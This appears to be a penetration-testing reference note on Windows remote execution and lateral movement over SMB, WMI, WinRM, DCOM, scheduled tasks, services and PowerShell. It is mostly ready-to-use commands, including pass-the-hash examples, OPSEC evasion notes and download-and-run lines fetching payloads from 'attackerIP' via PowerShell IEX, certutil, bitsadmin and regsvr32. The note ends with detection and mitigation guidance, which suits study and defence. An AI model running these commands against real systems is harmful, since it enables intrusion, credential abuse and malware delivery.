---
tags:
  - "#type/technique"
  - "#tactic/TA0002"
  - "#tactic/TA0008"
  - "#technique/T1021"
  - "#technique/T1569"
  - "#stage/execution"
  - "#stage/lateral-movement"
  - "#os/windows"
  - "#protocol/smb"
  - "#protocol/wmi"
  - "#protocol/winrm"
  - "#tool/impacket"
  - "#tool/netexec"
  - "#tool/cobalt-strike"
  - "#tool/metasploit"
aliases:
  - Remote Code Execution
  - Lateral Movement Techniques
  - Command and Control
  - Remote Process Execution
  - System Administration Tools

title: Execution Methods
---

## Technique
___

Execution methods encompass various techniques for running commands or code on remote systems. These methods are essential for lateral movement, privilege escalation, and maintaining access in a network environment. Each method has different requirements, stealth characteristics, and detection possibilities.

Attackers and penetration testers use these methods to:
- Execute commands on remote systems
- Deploy payloads or tools
- Establish persistence mechanisms
- Move laterally through a network
- Escalate privileges

## Prerequisites
___

**Access Level:** Varies by method - some require administrative privileges, others work with user-level access.

**System State:** Target system must be accessible via network and have the relevant services enabled.

**Information:** Valid credentials or authentication mechanisms for the target system.

## SMB Execution Methods
___

### PsExec

PsExec is a classic remote execution tool that uses the SMB protocol to execute commands on remote systems.

#### Using Impacket's psexec.py

```bash
# Basic execution with username/password
impacket-psexec domain.local/username:password@targetIP

# With NTLM hash (Pass the Hash)
impacket-psexec domain.local/username@targetIP -hashes :nthash

# Execute specific command
impacket-psexec domain.local/username:password@targetIP "whoami"

# Upload and execute binary
impacket-psexec domain.local/username:password@targetIP -c payload.exe
```

#### Using NetExec

```bash
# Execute command on multiple hosts
nxc smb 192.168.1.0/24 -u username -p password -x "whoami"

# Execute with Pass the Hash
nxc smb 192.168.1.0/24 -u username -H nthash -x "whoami"

# Execute PowerShell command
nxc smb 192.168.1.0/24 -u username -p password -X "Get-Process"
```

#### Using Windows Native PsExec

```cmd
# Basic execution
PsExec.exe \\targetIP -u username -p password cmd.exe

# Execute specific command
PsExec.exe \\targetIP -u username -p password -c "whoami"

# Run as System
PsExec.exe \\targetIP -s cmd.exe

# Interactive session
PsExec.exe \\targetIP -u username -p password -i cmd.exe
```

#### Using PowerShell Remoting with SMB

```powershell
# Create SMB session and execute
$sess = New-PSSession -ComputerName targetIP -Credential (Get-Credential)
Invoke-Command -Session $sess -ScriptBlock {whoami}

# Execute command without persistent session
Invoke-Command -ComputerName targetIP -Credential (Get-Credential) -ScriptBlock {whoami}
```

#### OPSEC Considerations

- Creates a new service on the target system (PSEXESVC.exe)
- Leaves artifacts in the service registry
- Generates Event ID 7045 (new service installation) and 4697 (service installation)
- Network traffic is visible on SMB port (445)

### SMBExec

SMBExec is similar to PsExec but executes commands through named pipes instead of creating a service.

#### Using Impacket's smbexec.py

```bash
# Basic execution
impacket-smbexec domain.local/username:password@targetIP

# With NTLM hash
impacket-smbexec domain.local/username@targetIP -hashes :nthash

# Execute specific command
impacket-smbexec domain.local/username:password@targetIP "whoami"
```

#### OPSEC Considerations

- Less noisy than PsExec (no service creation)
- Still generates SMB traffic
- Creates temporary files in ADMIN$ share
- May be detected by monitoring SMB file operations

## WMI Execution Methods
___

### WMIExec

WMIExec uses Windows Management Instrumentation to execute commands remotely.

#### Using Impacket's wmiexec.py

```bash
# Basic execution
impacket-wmiexec domain.local/username:password@targetIP

# With NTLM hash
impacket-wmiexec domain.local/username@targetIP -hashes :nthash

# Execute specific command
impacket-wmiexec domain.local/username:password@targetIP "whoami"

# Interactive shell
impacket-wmiexec domain.local/username:password@targetIP -shell
```

#### Using NetExec

```bash
# Execute command via WMI
nxc wmi 192.168.1.0/24 -u username -p password -x "whoami"

# With Pass the Hash
nxc wmi 192.168.1.0/24 -u username -H nthash -x "whoami"
```

#### Manual WMI Execution

```powershell
# Using PowerShell from Windows
Invoke-WmiMethod -ComputerName targetIP -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami"

# Using WMIC
wmic /node:targetIP /user:username /password:password process call create "cmd.exe /c whoami"
```

#### OPSEC Considerations

- Uses WMI protocol (typically port 135)
- Less noisy than SMB methods
- May trigger Event ID 4688 (process creation)
- WMI activity can be monitored
- Some EDR solutions monitor WMI command execution

## WinRM Execution Methods
___

### Evil-WinRM

Evil-WinRM is a WinRM shell for Windows that provides an interactive console.

```bash
# Basic connection
evil-winrm -i targetIP -u username -p password

# With NTLM hash
evil-winrm -i targetIP -u username -H nthash

# With Kerberos ticket
evil-winrm -i targetIP -u username -k

# Upload and execute file
upload payload.exe
./payload.exe
```

### Using NetExec

```bash
# Execute command via WinRM
nxc winrm 192.168.1.0/24 -u username -p password -x "whoami"

# With Pass the Hash
nxc winrm 192.168.1.0/24 -u username -H nthash -x "whoami"
```

### Manual WinRM Execution

```powershell
# Using PowerShell from Windows
Invoke-Command -ComputerName targetIP -Credential (Get-Credential) -ScriptBlock {whoami}

# Using winrs command
winrs -r:targetIP -u:username -p:password "whoami"
```

#### OPSEC Considerations

- Requires WinRM to be enabled (not default on workstations)
- Uses HTTP/HTTPS (ports 5985/5986)
- Generates Event ID 4688 (process creation)
- WinRM connections can be monitored
- SSL/TLS encryption can hide command content

## DCOM Execution Methods
___

### DCOM Execution via Excel

```powershell
# Create DCOM object
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","targetIP"))

# Execute command
$com.DisplayAlerts = $false
$result = $com.ExecuteExcel4Macro("CALL(""cmd.exe"",""/c whoami"",""C"")")
```

### DCOM Execution via MMC

```powershell
# Create MMC application object
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","targetIP"))

# Execute command
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami","7")
```

#### OPSEC Considerations

- Uses DCOM protocol (typically port 135)
- Less commonly monitored than SMB/WMI
- May trigger antivirus/EDR alerts
- Requires DCOM to be enabled on target

## Scheduled Task Execution
___

### Using NetExec

```bash
# Create and execute scheduled task
nxc smb 192.168.1.10 -u username -p password --at-exec "whoami"

# With Pass the Hash
nxc smb 192.168.1.10 -u username -H nthash --at-exec "whoami"
```

### Manual Scheduled Task Creation

```powershell
# Using PowerShell from Windows
Invoke-Command -ComputerName targetIP -Credential (Get-Credential) -ScriptBlock {
    schtasks /create /tn "TaskName" /tr "cmd.exe /c whoami > C:\temp\output.txt" /sc once /st 00:00
    schtasks /run /tn "TaskName"
    schtasks /delete /tn "TaskName" /f
}

# Using schtasks directly
schtasks /s targetIP /u username /p password /create /tn "TaskName" /tr "cmd.exe /c whoami" /sc once /st 00:00
schtasks /s targetIP /u username /p password /run /tn "TaskName"
```

#### OPSEC Considerations

- Creates temporary scheduled task
- Generates Event ID 4698 (scheduled task creation)
- Task execution creates Event ID 4688 (process creation)
- Can be detected by monitoring task creation
- Less noisy than service creation

## Service Execution Methods
___

### Using NetExec

```bash
# Create and execute service
nxc smb 192.168.1.10 -u username -p password --service-exec "whoami"

# With Pass the Hash
nxc smb 192.168.1.10 -u username -H nthash --service-exec "whoami"
```

### Manual Service Creation

```powershell
# Using PowerShell from Windows
Invoke-Command -ComputerName targetIP -Credential (Get-Credential) -ScriptBlock {
    New-Service -Name "ServiceName" -BinaryPathName "cmd.exe /c whoami" -DisplayName "DisplayName"
    Start-Service -Name "ServiceName"
    Stop-Service -Name "ServiceName"
    Remove-Service -Name "ServiceName"
}

# Using sc command
sc \\targetIP create ServiceName binpath= "cmd.exe /c whoami"
sc \\targetIP start ServiceName
sc \\targetIP delete ServiceName
```

#### OPSEC Considerations

- Creates new service on target system
- Generates Event ID 7045 (new service installation)
- Service execution creates Event ID 4688 (process creation)
- Highly detectable by security solutions
- Leaves registry artifacts

## Remote PowerShell Execution
___

### PowerShell Remoting

```powershell
# Basic remoting
Enter-PSSession -ComputerName targetIP -Credential (Get-Credential)

# Execute command
Invoke-Command -ComputerName targetIP -Credential (Get-Credential) -ScriptBlock {whoami}

# Execute script
Invoke-Command -ComputerName targetIP -Credential (Get-Credential) -FilePath script.ps1
```

### PowerShell Web Delivery

```powershell
# On attacker machine (setup web server)
python -m http.server 80

# On target machine
powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attackerIP/payload.ps1')"
```

#### OPSEC Considerations

- Requires PowerShell remoting to be enabled
- Uses WinRM protocol (ports 5985/5986)
- Command logging may be enabled
- AMSI (Antimalware Scan Interface) may block malicious code
- Constrained Language Mode may restrict execution

## Living Off The Land Execution
___

### Using Built-in Tools

```cmd
# Using certutil to download and execute
certutil -urlcache -split -f http://attackerIP/payload.exe payload.exe && payload.exe

# Using bitsadmin to download and execute
bitsadmin /transfer myjob /download /priority normal http://attackerIP/payload.exe C:\temp\payload.exe && C:\temp\payload.exe

# Using rundll32 to execute code
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("cmd /c whoami");

# Using regsvr32 to execute scriptlet
regsvr32 /s /n /u /i:http://attackerIP/payload.sct scrobj.dll
```

#### OPSEC Considerations

- Uses legitimate system tools
- May bypass application whitelisting
- Less likely to be detected by signature-based AV
- Still detectable by behavior analysis
- Some tools have known malicious usage patterns

## Detection & Mitigation
___

### Detection

- Monitor for new service creation (Event ID 7045)
- Watch for scheduled task creation (Event ID 4698)
- Track process creation events (Event ID 4688)
- Monitor network connections to unusual ports
- Analyze command-line arguments for suspicious patterns
- Watch for file operations in administrative shares
- Monitor WMI and WinRM activity
- Track authentication events from unusual sources

### Mitigation

- Implement principle of least privilege
- Use Local Administrator Password Solution (LAPS)
- Disable unnecessary services (WinRM, WMI, DCOM)
- Implement application whitelisting
- Deploy endpoint detection and response (EDR) solutions
- Monitor and restrict administrative tools
- Implement network segmentation
- Use privileged access workstations (PAWs)
- Enable just-in-time (JIT) administration
- Implement credential guard and other protection mechanisms